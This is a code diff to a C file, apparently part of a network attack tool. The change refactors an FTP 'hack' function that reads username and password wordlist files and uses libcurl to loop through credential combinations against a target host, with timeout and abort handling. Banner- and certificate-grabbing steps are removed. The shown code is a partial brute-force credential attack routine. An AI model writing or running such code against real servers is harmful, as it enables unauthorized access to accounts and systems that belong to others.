@@ -30,31 +30,19 @@ static size_t callback(void *data, size_t size, size_t nmemb, void *userp){
 	return realsize;
 }
 
-int hack_port_21(in_addr_t ip, int port, int scanType){
-	// Port banner grabbing
-	printf("%s", WHITE);
-	printf("\nTrying to port grabbing...\n\n");
-	printf("%s",BLUE);
-	port_grabbing(ip, port);
-	// CERT grabbing
-	printf("%s", WHITE);
-	printf("\nTrying to obtain certs...\n\n");
-	printf("%s",BLUE);
+int hack_ftp(in_addr_t ip, int port){
 	curl_global_init(CURL_GLOBAL_ALL);
 	char url[50]="";
-	snprintf(url,sizeof(url),"ftp://%s/",inet_ntoa(*((struct in_addr*)&dest_ip.s_addr)));
-	cert_grabbing(url);
-	if(scanType==FOOTPRINTING_SCAN) return EXIT_SUCCESS;
-	// Brute Force Attack
-	printf("%s", WHITE);
+	snprintf(url,sizeof(url),"ftp://%s:%d/",inet_ntoa(*((struct in_addr*)&dest_ip.s_addr)), port);
+	CURL *mCurl=curl_easy_init();
 	printf("\nTrying to perform connections by using brute force...\n\n");
 	printf("%s",BLUE);
 	double totalComb=0, cont=0;
 	int i=0, timeouts=0;
 	FILE *f=NULL;
 	int totalUsernames=0;
-	if((totalUsernames=open_file("p21_p22_usernames.txt",&f))==-1){
-		show_error("Opening usernames.txt file error",errno);
+	if((totalUsernames=open_file("usernames_FTP_SSH.txt",&f))==-1){
+		show_error("Opening usernames_FTP_SSH.txt file error",errno);
 		return -1;
 	}
 	char **usernames = (char**)malloc(totalUsernames * sizeof(char*));
@@ -62,8 +50,8 @@ int hack_port_21(in_addr_t ip, int port, int scanType){
 	i=0;
 	while(fscanf(f,"%s", usernames[i])!=EOF) i++;
 	int totalPasswords=0;
-	if((totalPasswords=open_file("p21_FTP_passwords.txt",&f))==-1){
-		show_error("Opening p21_FTP_passwords.txt file error", errno);
+	if((totalPasswords=open_file("passwords_FTP.txt",&f))==-1){
+		show_error("Opening passwords_FTP.txt file error", errno);
 		return -1;
 	}
 	char **passwords = (char**)malloc(totalPasswords * sizeof(char*));
@@ -75,7 +63,6 @@ int hack_port_21(in_addr_t ip, int port, int scanType){
 	char *ftpEntryPath=NULL;
 	struct memory chunk = {0};
 	CURLcode res;
-	CURL *mCurl=curl_easy_init();
 	if (mCurl){
 		for(i=0;i<totalUsernames && timeouts<BRUTE_FORCE_TIMEOUT && abort==FALSE;i++){
 			for(int j=0;j<totalPasswords && timeouts<BRUTE_FORCE_TIMEOUT && abort==FALSE;j++,cont++){
@@ -119,7 +106,6 @@ int hack_port_21(in_addr_t ip, int port, int scanType){
 	if(timeouts==3) printf("\n\nBrute Force hacking aborted by timeouting");
 	curl_easy_cleanup(mCurl);
 	curl_global_cleanup();
-	printf("\n");
 	printf("%s",DEFAULT);
 	return 0;
 }
